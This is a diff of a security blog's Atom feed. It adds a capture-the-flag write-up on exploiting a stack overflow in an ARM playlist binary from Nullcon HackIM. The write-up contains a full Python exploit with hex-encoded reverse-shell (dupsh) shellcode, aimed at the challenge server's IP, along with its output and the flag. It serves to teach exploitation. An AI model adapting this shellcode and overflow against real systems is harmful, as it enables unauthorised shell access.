@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Pwn, | GeeksSpeak Team Blog]]></title>
   <link href="http://geeksspeak.github.io/blog/categories/pwn/atom.xml" rel="self"/>
   <link href="http://geeksspeak.github.io/"/>
-  <updated>2015-09-21T18:11:52+04:30</updated>
+  <updated>2016-01-31T16:08:00-05:00</updated>
   <id>http://geeksspeak.github.io/</id>
   <author>
     <name><![CDATA[GeeksSpeak]]></name>
@@ -14,9 +14,103 @@
 
   
   <entry>
+    <title type="html"><![CDATA[Nullcon CTF - HackIM - Expl 100 - ARM]]></title>
+    <link href="http://geeksspeak.github.io/blog/2016/01/31/nullcon-ctf-hackim-expl-100-arm/"/>
+    <updated>2016-01-31T15:44:47-05:00</updated>
+    <id>http://geeksspeak.github.io/blog/2016/01/31/nullcon-ctf-hackim-expl-100-arm</id>
+    <content type="html"><![CDATA[<p>Hi,</p>
+
+<p>I participate in NullCon CTF with my team in this week. one of the challenge i solved was an arm binary pwn one.</p>
+
+<pre><code class="bash">hamidx9@expl:~/ctf/nullcon/expl100$ file pinkfloyd
+pinkfloyd: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=62c86841d0c0384ce39d70fef5afe0eee5cad7b4, not stripped
+</code></pre>
+
+<p><code>pinkfloyd</code> is a arm binary which provide saving playlist functionality. we can see two methods <em>create, print</em>. Analyzing <code>cmd_do_create</code> gives us the clue that it read from input 3 param, <em>name, tag, # of songs</em>. A little more reading the diseases shows if we use more that 84 chars in tag we overflow the stack. So we can abuse this method.</p>
+
+<pre><code>gdb-peda$ checksec 
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : Partial
+</code></pre>
+
+<p>Also <code>checksec</code> shows us we have a very suitable case, we can execute our <code>shellcode</code>.  For hijacking <code>pc</code> we should overwrite <code>lr</code> register so on returning from the call, we have full control. based on <code>add_playlist</code> function <code>myplaylist</code> on <code>bss</code> always has last playlist struct address. So we should change our <code>pc</code> to playlist struct address to run our shellcode which exists in playlist name. Also we should notice our sock fd is <code>4</code> so we need a <code>dupsh(4)</code> shellcode. Ok, too much talking, let’s do this.</p>
+
+<pre><code class="python">
+#!/usr/bin/python
+
+# By HAMIDx9 :: GeeksSpeak :: ctf.nullcon.net HackIM :: Exploit 100
+
+import struct
+from hexdump import hexdump
+import socket
+import telnetlib
+
+q = lambda x: struct.pack("&lt;I", x)
+
+#ret = q(0x0002605c) 
+
+shellcode = "01608fe216ff2fe14ff002014ff03f0708460d462846284401df0139fad504a082ea02024ff00b0705b4694601df01012f62696e2f736800".decode("hex") 
+# Custom dupsh(4) thumb shellcode based on current execution
+# To see whats going on : 
+# from pwn import *
+# context(arch="thumb", os="linux")
+# print asm(shellcode[4:]) # skip change to thumb mode arm shellcode
+
+hexdump(shellcode)
+
+s = socket.socket()
+s.connect(("52.72.171.221", 9981))
+#s.connect(("localhost", 9981))
+
+s.recv(1024)
+s.send("create\n") # create a playlist
+
+s.recv(1024)
+s.send(shellcode+"\n") # playlist name
+
+s.recv(1024)
+#s.send("A"*100+"\n") # crashes in playlist tag
+s.send("A"*80+"BBBB"+q(0x8C0CC)+"\n") # set lr to myplaylist to jump to it then,
+# after returning from cmd_do_create pop {lr, pc} pops heap address of playlist name in pc which has our dupsh(4) shellcode
+
+s.recv(1024)
+s.send("1"+"\n") # playlist tracks 
+
+
+print “[+] Here you go”
+t = telnetlib.Telnet()
+t.sock = s
+
+t.interact() # interact
+</code></pre>
+
+<p>And running the expl:
+<code>bash
+KernelsCallMe:exp100 hamidx9$ python sol.py
+00000000: 01 60 8F E2 16 FF 2F E1  4F F0 02 01 4F F0 3F 07  .`..../.O...O.?.
+00000010: 08 46 0D 46 28 46 28 44  01 DF 01 39 FA D5 04 A0  .F.F(F(D...9....
+00000020: 82 EA 02 02 4F F0 0B 07  05 B4 69 46 01 DF 01 01  ....O.....iF....
+00000030: 2F 62 69 6E 2F 73 68 00                           /bin/sh.
+[+] Here you go
+cat *
+cat: bin: Is a directory
+cat: dev: Is a directory
+flag-{intr0-70-ARM-pwn4g3-4-fuN-n-pr0Fi7}
+</code></p>
+
+<p>So the flag is <code>flag-{intr0-70-ARM-pwn4g3-4-fuN-n-pr0Fi7}</code> and we have 100 pts.</p>
+
+<p>@HAMIDx9</p>
+]]></content>
+  </entry>
+  
+  <entry>
     <title type="html"><![CDATA[CSAW 2015 - PWN250 - Contacts]]></title>
     <link href="http://geeksspeak.github.io/blog/2015/09/21/csaw-2015-pwn250-contacts/"/>
-    <updated>2015-09-21T17:43:52+04:30</updated>
+    <updated>2015-09-21T09:13:52-04:00</updated>
     <id>http://geeksspeak.github.io/blog/2015/09/21/csaw-2015-pwn250-contacts</id>
     <content type="html"><![CDATA[<p><strong>CSAW 2015 contacts Writeup</strong><br/>
 <strong>Point = 250</strong><br/>
